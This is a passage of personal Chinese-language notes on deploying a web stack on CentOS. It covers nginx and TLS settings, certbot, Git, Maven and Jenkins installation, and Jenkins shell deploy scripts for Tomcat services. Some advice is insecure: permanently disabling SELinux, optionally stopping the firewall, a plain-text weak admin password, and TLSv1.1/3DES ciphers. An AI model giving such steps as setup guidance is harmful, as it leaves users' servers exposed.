    # 静态资源跨域
    location /static/ {
	# 服务端已经添加了 header 参数
        #add_header 'Access-Control-Allow-Origin' '*';
        #add_header 'Access-Control-Allow-Credentials' 'true';
	
	# 防盗链
	valid_referers server_names *.m1yellow.cn m1yellow.* gitee.* 8.129.220.131/ 172.23.199.172/ 43.129.189.39/ 172.19.0.7/ ~\.google\. ~\.baidu\. ~\.github\. ~\.gitee\.;
        if ($invalid_referer) {
            return 403;
            #rewrite ^/ http://www.m1yellow.cn/images/error/403.jpg;
        }
	
        #proxy_pass http://172.23.199.172:8081/;
        #proxy_pass http://172.19.0.7:8081/;
        proxy_pass https://mypages.oss-cn-shenzhen.aliyuncs.com/;
    }


    #error_page  404              /404.html;

    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
    #
    #location ~ \.php$ {
    #    proxy_pass   http://127.0.0.1;
    #}

    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    #location ~ \.php$ {
    #    root           html;
    #    fastcgi_pass   127.0.0.1:9000;
    #    fastcgi_index  index.php;
    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
    #    include        fastcgi_params;
    #}

    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    #
    #location ~ /\.ht {
    #    deny  all;
    #}
 
}

```



##### SSL 加密算法

```
ssl_protocols TLSv1.2 TLSv1.3; # 支持的协议版本
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384; # 安全链接可选的加密套件
ssl_prefer_server_ciphers off; # 是否使用服务器端的首选算法


ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # 支持的协议版本
ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5; # 安全链接可选的加密套件
ssl_prefer_server_ciphers on; # 是否使用服务器端的首选算法
ssl_session_cache shared:SSL:10m; # session 会话缓存有效期
ssl_session_timeout 10m; # session 会话超时时间

```





##### let's encrypt 免费证书

```shell
# 安装Certbot
yum install certbot python2-certbot-nginx

# 生成证书到本地已安装的 nginx 目录 /etc/nginx
[dvlp@VM-0-7-centos ~]$ sudo certbot certonly --nginx
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Plugins selected: Authenticator nginx, Installer nginx
Enter email address (used for urgent renewal and security notices)
 (Enter 'c' to cancel): m1yellow@163.com



# 若nginx未安装在默认路径(/etc/nginx or /usr/local/etc/nginx)下需自己指定nginx路径
certbot certonly --nginx --nginx-server-root=/root/nginx/conf


# 安装泛域名证书
[dvlp@VM-0-7-centos html]$ certbot certonly --preferred-challenges dns --manual -d *.m1yellow.cn --server https://acme-v02.api.letsencrypt.org/directory
The following error was encountered:
[Errno 13] Permission denied: '/var/log/letsencrypt/.certbot.lock'
Either run as root, or set --config-dir, --work-dir, and --logs-dir to writeable paths.
[dvlp@VM-0-7-centos html]$ sudo certbot certonly --preferred-challenges dns --manual -d *.m1yellow.cn --server https://acme-v02.api.letsencrypt.org/directory
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Plugins selected: Authenticator manual, Installer None
Starting new HTTPS connection (1): acme-v02.api.letsencrypt.org
Requesting a certificate for *.m1yellow.cn
Performing the following challenges:
dns-01 challenge for m1yellow.cn

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please deploy a DNS TXT record under the name
_acme-challenge.m1yellow.cn with the following value:

Zm7k5AFOU8NvHoEc1PwsezksuQTuBh65eMUhLVPqDag

Before continuing, verify the record is deployed.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Press Enter to Continue
Waiting for verification...
Cleaning up challenges

IMPORTANT NOTES:
 - Congratulations! Your certificate and chain have been saved at:
   /etc/letsencrypt/live/m1yellow.cn/fullchain.pem
   Your key file has been saved at:
   /etc/letsencrypt/live/m1yellow.cn/privkey.pem
   Your certificate will expire on 2021-09-14. To obtain a new or
   tweaked version of this certificate in the future, simply run
   certbot again. To non-interactively renew *all* of your
   certificates, run "certbot renew"
 - If you like Certbot, please consider supporting our work by:

   Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate
   Donating to EFF:                    https://eff.org/donate-le


```



#### Permission denied

- [解决Nginx出现403 forbidden (13: Permission denied)报错的四种方法](https://blog.csdn.net/onlysunnyboy/article/details/75270533)



```
2021/07/13 05:27:44 [crit] 8169#8169: *1 connect() to 192.168.137.151:8000 failed (13: Permission denied) while connecting to upstream, client: 192.168.137.1, server: localhost, request: "GET /api/admin/home HTTP/1.1", upstream: "http://192.168.137.151:8000/admin/home", host: "192.168.137.151", referrer: "http://192.168.137.151/"
```



> selinux 的问题

linux 在安装时，默认会安装SeLinux。这是Linux的一个内核模块，作用是最大限度地减少系统中服务进程可访问的资源，默认是开启的。

查看SeLinux

1、/usr/sbin/sestatus -v

如果SELinux status:  enabled，说明SeLinux是开启的。

2、getenforce                 ##也可以用这个命令检查

关闭SeLinux

1、临时关闭命令

setenforce 0                  设置SELinux 成为permissive模式

2、永久关闭

修改/etc/selinux/config 文件

将SELINUX=enforcing改为SELINUX=disabled

reboot 重启服务器。






### 安装 Git

https://blog.csdn.net/liuxiao723846/article/details/106940099



系统centos7，默认安装的git版本是1.8，在使用code server、jenkins等软件时，偶尔提示失败。原因是git版本太低。接下来，我们升级git。



```shell
#执行安装命令
sudo yum install git -y

#验证Git，查看版本
git --version
git version 1.8.3

# 安装高版本git
sudo yum remove git

# 下载二进制压缩包
# https://git-scm.com/ download界面选择操作系统类型，下载。需要手动编译安装。
cd ~
sudo wget https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.32.0.tar.gz
或者
curl -O https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.32.0.tar.gz

tar -xvzf git-2.32.0.tar.gz
 
cd git-2.32.0

# 安装依赖包
sudo yum install -y curl-devel expat-devel gettext-devel openssl-devel zlib-devel bzip2-devel gcc perl-ExtUtils-MakeMaker

# 安装依赖时，yum自动安装了git，需要卸载旧版本git
sudo yum -y remove git

# 手动编译安装挺烦的，编译耗时很久，很糟心的是突然报错终止，然后各种排错，又重新编译，唉
# 如果报错，根据提示，安装需要的依赖

#安装Git至/usr/local/路径（自定义）：
# 编译，这一步比较耗时，需要等待一刻
sudo make prefix=/usr/local/git all
# 安装
sudo make prefix=/usr/local/git install

#配置环境变量：
cat /etc/profile
#sudo echo "export PATH=$PATH:/usr/local/git/bin" >> /etc/profile
sudo vim /etc/profile

# 在 export JAVA_HOME JRE_HOME PATH CLASSPATH 下方添加
# git
export PATH=$PATH:/usr/local/git/bin

# 刷新配置
source /etc/profile

# 查看新版本
git --version
git version 2.32.0

#配置基本信息
[root@localhost ~]# git config --global user.name "m1yellow"
[root@localhost ~]# git config --global user.email "m1yellow@163.com"
#查看配置
[root@localhost ~]# git config --list


```



### 安装 Maven

```shell
# 下载安装包
wget https://repo.huaweicloud.com/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz

# 或者手动从官网下载，再上传
https://maven.apache.org/download.cgi

tar -zxvf apache-maven-3.6.3-bin.tar.gz /usr/local/

#编辑vim /etc/profile文件，添加Maven环境变量
# maven
export MAVEN_HOME=/usr/local/apache-maven-3.6.3
export PATH=$MAVEN_HOME/bin:$PATH

#重新加载配置，执行命令
source /etc/profile
#验证
mvn -version

#创建一个目录，做为Maven仓库，并修改国内源
mkdir apache-maven-3.6.3/repository
vim apache-maven-3.6.3/conf/settings.xml

<!--本地仓库-->          
<localRepository>/usr/local/apache-maven-3.6.3/repository</localRepository>

<!--阿里源--> 
<mirror>
    <id>nexus-aliyun</id>
    <mirrorOf>central</mirrorOf>
    <name>Nexus aliyun</name>
    <url>http://maven.aliyun.com/nexus/content/groups/public</url>
</mirror>


```



Maven中-DskipTests和-Dmaven.test.skip=true的区别

在使用mvn package进行编译、打包时，Maven会执行src/test/java中的JUnit测试用例，有时为了跳过测试，会使用参数-DskipTests和-Dmaven.test.skip=true，这两个参数的主要区别是：

-DskipTests，不执行测试用例，但编译测试用例类生成相应的class文件至target/test-classes下。

-Dmaven.test.skip=true，不执行测试用例，也不编译测试用例类。



### 安装 Jenkins

- [Jenkins+Maven+Gitee自动化部署Springboot项目](https://www.cnblogs.com/dyd168/p/14391485.html)
- [jenkins+gitee 实现自动化部署项目到centos上](https://blog.csdn.net/chengqiuming/article/details/107891142)
- [jenkins 搭建gitee实现代码自动化部署](https://www.jianshu.com/p/9bcc5eb38b08)



```shell
# 在线安装：由于网络限制，建议使用国内镜像站下载
wget https://repo.huaweicloud.com/jenkins/war/版本/jenkins.war

# 离线安装：进入官方下载页面，建议下载LTS长期支持版，复制链接地址使用迅雷等工具进行下载
https://www.jenkins.io/zh/download/
wget http://mirrors.jenkins.io/war-stable/2.289.1/jenkins.war

# 启动 Jenkins
nohup java -jar jenkins.war --httpPort=8090 > jenkins.log 2>&1 &


nohup 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。
nohup 命令，在默认情况下（非重定向时），会输出一个名叫 nohup.out 的文件到当前目录下，如果当前目录的 nohup.out 文件不可写，输出重定向到 $HOME/nohup.out 文件中。

2>&1 解释：
将标准错误 2 重定向到标准输出 &1 ，标准输出 &1 再被重定向输入到 runoob.log 文件中。
0 – stdin (standard input，标准输入)
1 – stdout (standard output，标准输出)
2 – stderr (standard error，标准错误输出)


ps -aux|grep "jenkins" 
参数说明：
a : 显示所有程序
u : 以用户为主的格式来显示
x : 显示所有程序，不区分终端机

kill -9  进程号PID # 强制结束进程


# tail -f jenkins.log 命令查看输出日志，获取Jenkins密码并记录Jenkins密钥
02769b37ea614a458e7302cbb872603c

# 开启防火墙8090端口
sudo firewall-cmd --zone=public --add-port=8090/tcp --permanent
# 重启防火墙
sudo systemctl restart firewalld
# 查看端口是否开放
sudo firewall-cmd --list-port
# 或者停用防火墙，关闭防火墙并禁止开机自启
sudo systemctl stop firewalld && systemctl disable firewalld


# 自动安装完插件后，创建管理员用户
admin 123456.a

常用插件安装
修改源
由于是国外网址，插件下载太慢，所以先更换一下安装源
依次点击【Maanage Jenkins】→【Manage Plugins】→【Advanced】，划到最下面修改升级站点URL
https://repo.huaweicloud.com/jenkins/updates/update-center.json


#Jenkins 下载 Maven 依赖 报错【仓库目录权限问题】
第一次使用Jenkins拉取Git项目，构建项目时发现Maven 下载失败；
检查了Maven settings.xml 镜像地址是国内的，仓库地址也配置了，环境没有问题；

问题原因：
最后发现问题是 服务器配置的Maven本地仓库目录权限是root 用户，而我操作Jenkins 使用的是Jenkins 用户，所有Jenkins用户 没有权限操作 本地仓库目录

可以使用Jenkins用户创建一个仓库，修改maven 的settings.xml 仓库地址。

或者，chown 修改仓库目录所属为运行 Jenkins 的用户


```



#### jenkins 部署流程

![img](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/jenkins-work-process.png)



#### 插件安装

| 插件                              | 描述                   |
| --------------------------------- | ---------------------- |
| SSH plugin                        | SSH 插件（自动安装）   |
| Publish over SSH                  | 执行 SSH 命令行        |
| Maven Integration                 | maven 插件             |
| Role-based Authorization Strategy | 根据角色管理权限的插件 |
|                                   |                        |



#### 配置注意

##### SSH: Transferred 0 file(s)

Jenkins搭建过程中，使用 Publish Over SSH 插件。发生 SSH: Transferred 0 file(s)。

配置如下：

Source files      `**/*`  表示 {projectName} 这个 job 的工作目录下所有的文件和目录，也就是不用填项目名称。
Remove prefix   该操作是针对上面的source files目录，会移除匹配的目录。通常留空。
Remote directory 该操作是基于设定的服务器目录进行。
Exec command 远程服务器执行的命令。例如可以输出 service jenkins restart 或者 /home/xx. sh 均可。



总结

Source files 不要填绝对路径，要写相对路径。 举个栗子： 最终打包所在路径是： /var/lib/jenkins/workspace/erp/target/erp.jar    这里要填 target/*。



##### 指定打包模块

**build 配置1**

clean install -pl mypages-common,mypages-excavation,mypages-generator -am

pom.xml



**build 配置2**

clean package -Dmaven.test.skip=true

mypages-admin/pom.xml



#### 部署脚本

##### mypages-admin 部署到 docker tomcat01 容器

```shell
#!/bin/bash
echo ">>>> docker stop tomcat01"
docker stop tomcat01
cd /home/tomcat/tomcat01/webapps/
if [ -d "mypages-admin/WEB-INF/classes/public/" ];then
    tar -zcvf /home/tomcat/public.tar.gz mypages-admin/WEB-INF/classes/public/
fi
if [ -f "mypages.war" ];then
	mv mypages.war mypages-admin.war
fi
rm -rf mypages-admin/
echo ">>>> unzip war"
unzip -o mypages-admin.war -d mypages-admin
rm -rf mypages-admin.war
if [ -f "/home/tomcat/public.tar.gz" ];then
    tar -zxvf /home/tomcat/public.tar.gz -C mypages-admin/WEB-INF/classes/
fi
echo ">>>> docker start tomcat01"
docker start tomcat01
echo ">>>> finished"

```



##### mypages-admin 部署到主机 tomcat-mypages-admin

前提条件

Jenkins SSH Publishers Transfers 把打包文件复制到了指定目录。

```shell
#!/bin/bash
echo ">>>> stop tomcat-mypages-admin"
pid=`ps -ef | grep tomcat-mypages-admin | grep -v grep | awk '{print $2}'`
if [ -n "$pid" ]
then
	sh /home/web/tomcat/tomcat-mypages-admin/bin/shutdown.sh
	sleep 5s
	pid=`ps -ef | grep tomcat-mypages-admin | grep -v grep | awk '{print $2}'`
    if [ -n "$pid" ]
    then
        kill -9 $pid
        sleep 2s
    fi
fi
cd /home/web/tomcat/tomcat-mypages-admin/webapps/
if [ -d "mypages-admin/WEB-INF/classes/public/" ];then
    tar -zcvf /home/web/tomcat/public.tar.gz mypages-admin/WEB-INF/classes/public/
fi
if [ -f "mypages.war" ];then
	mv mypages.war mypages-admin.war
fi
rm -rf mypages-admin/
echo ">>>> unzip war"
unzip -o mypages-admin.war -d mypages-admin
rm -rf mypages-admin.war
if [ -f "/home/web/tomcat/public.tar.gz" ];then
    tar -zxvf /home/web/tomcat/public.tar.gz -C mypages-admin/WEB-INF/classes/
fi
echo ">>>> start tomcat-mypages-admin"
cd /home/web/tomcat/tomcat-mypages-admin/
sh /home/web/tomcat/tomcat-mypages-admin/bin/startup.sh
echo ">>>> finished"

```



##### mypages-auth 部署到主机 tomcat-mypages-auth

前提条件

Jenkins SSH Publishers Transfers 把打包文件复制到了指定目录。

```shell
#!/bin/bash
echo ">>>> stop tomcat-mypages-auth"
pid=`ps -ef | grep tomcat-mypages-auth | grep -v grep | awk '{print $2}'`
if [ -n "$pid" ]
then
	sh /home/web/tomcat/tomcat-mypages-auth/bin/shutdown.sh
	sleep 5s
	pid=`ps -ef | grep tomcat-mypages-auth | grep -v grep | awk '{print $2}'`
    if [ -n "$pid" ]
    then
        kill -9 $pid
        sleep 2s
    fi
fi
cd /home/web/tomcat/tomcat-mypages-auth/webapps/
rm -rf mypages-auth/
echo ">>>> unzip war"
unzip -o mypages-auth.war -d mypages-auth
rm -rf mypages-auth.war
echo ">>>> start tomcat-mypages-auth"
cd /home/web/tomcat/tomcat-mypages-auth/
sh /home/web/tomcat/tomcat-mypages-auth/bin/startup.sh
echo ">>>> finished"


```



##### mypages-god 部署到主机 tomcat-mypages-god

前提条件

Jenkins SSH Publishers Transfers 把打包文件复制到了指定目录。

```shell
#!/bin/bash
echo ">>>> stop tomcat-mypages-god"
pid=`ps -ef | grep tomcat-mypages-god | grep -v grep | awk '{print $2}'`
if [ -n "$pid" ]
then
	sh /home/web/tomcat/tomcat-mypages-god/bin/shutdown.sh
	sleep 5s
	pid=`ps -ef | grep tomcat-mypages-god | grep -v grep | awk '{print $2}'`
    if [ -n "$pid" ]
    then
        kill -9 $pid
        sleep 2s
    fi
fi
cd /home/web/tomcat/tomcat-mypages-god/webapps/
rm -rf mypages-god/
echo ">>>> unzip war"
unzip -o mypages-god.war -d mypages-god
rm -rf mypages-god.war
echo ">>>> start tomcat-mypages-god"
cd /home/web/tomcat/tomcat-mypages-god/
sh /home/web/tomcat/tomcat-mypages-god/bin/startup.sh
echo ">>>> finished"


```



##### mypages-excavation 部署到主机 tomcat-mypages-excavation

前提条件

Jenkins SSH Publishers Transfers 把打包文件复制到了指定目录。

```shell
#!/bin/bash
echo ">>>> stop tomcat-mypages-excavation"
pid=`ps -ef | grep tomcat-mypages-excavation | grep -v grep | awk '{print $2}'`
if [ -n "$pid" ]
then
	sh /home/web/tomcat/tomcat-mypages-excavation/bin/shutdown.sh
	sleep 5s
	pid=`ps -ef | grep tomcat-mypages-excavation | grep -v grep | awk '{print $2}'`
    if [ -n "$pid" ]
    then
        kill -9 $pid
        sleep 2s
    fi
fi
cd /home/web/tomcat/tomcat-mypages-excavation/webapps/
rm -rf mypages-excavation/
echo ">>>> unzip war"
unzip -o mypages-excavation.war -d mypages-excavation
rm -rf mypages-excavation.war
echo ">>>> start tomcat-mypages-excavation"
cd /home/web/tomcat/tomcat-mypages-excavation/
sh /home/web/tomcat/tomcat-mypages-excavation/bin/startup.sh
echo ">>>> finished"


```



##### mypages-gateway 部署到主机 mypages-gateway.jar

前提条件

Jenkins SSH Publishers Transfers 把打包文件复制到了指定目录。

```shell
#!/bin/bash
export BUILD_ID=dontKillMe
echo ">>>> stop mypages-gateway.jar"
pid=`ps -ef | grep mypages-gateway | grep -v grep | awk '{print $2}'`
if [ -n "$pid" ]
then
	kill -9 $pid
	sleep 5s
fi
cd /home/web/gateway
rm -rf mypages-gateway.jar
mv temp/mypages-gateway.jar .
echo ">>>> start mypages-gateway.jar"
nohup java -server -Xms256m -Xmx256m -Xmn128m -Xss512K -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=128m -XX:PermSize=128m -XX:MaxPermSize=128m -XX:MaxDirectMemorySize=128m -XX:SurvivorRatio=3 -XX:TargetSurvivorRatio=90 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSFullGCsBeforeCompaction=5 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ExplicitGCInvokesConcurrent -XX:-OmitStackTraceInFastThrow -XX:+PrintCommandLineFlags -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -Xloggc:/home/web/logs/gc/mypages-gateway/gc-%t.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M -jar mypages-gateway.jar >/home/web/gateway/logs/mypages-gateway_`date +%Y-%m-%d`.log 2>&1 &
sleep 3s
echo ">>>> finished"


```



**/dev/null**

日志输出到一个“无底洞”，Jenkins控制台就不会一直卡在日志页面了，就能正常结束了。



**2>&1**

将标准错误 2 重定向到标准输出 &1 ，标准输出 &1 再被重定向输入到 runoob.log 文件中。& 让命令在后台执行，终端退出后命令仍旧执行。

- 0 – stdin (standard input，标准输入)
- 1 – stdout (standard output，标准输出)
- 2 – stderr (standard error，标准错误输出)



#### 设置 JVM 参数

```shell
# 修改tomcat参数
vim /home/web/tomcat/tomcat-jenkins/bin/catalina.sh

# 在#!/bin/sh 下方添加
JAVA_OPTS="-server -Xms1024m -Xmx1024m -Xmn600m -XX:MetaspaceSize=256m -XX:MaxMetaspaceSize=256m -XX:PermSize=256m -XX:MaxPermSize=256m -XX:MaxDirectMemorySize=256m -XX:-UseAdaptiveSizePolicy -XX:SurvivorRatio=6 -XX:TargetSurvivorRatio=90 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSFullGCsBeforeCompaction=5 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ExplicitGCInvokesConcurrent -XX:-OmitStackTraceInFastThrow -XX:+PrintCommandLineFlags -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/home/web/gc/mypages -XX:+PrintGCDetails -XX:+PrintGCDateStamps -Xloggc:/home/web/logs/gc/mypages/gc-%t.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=7M"


```





## 面试题



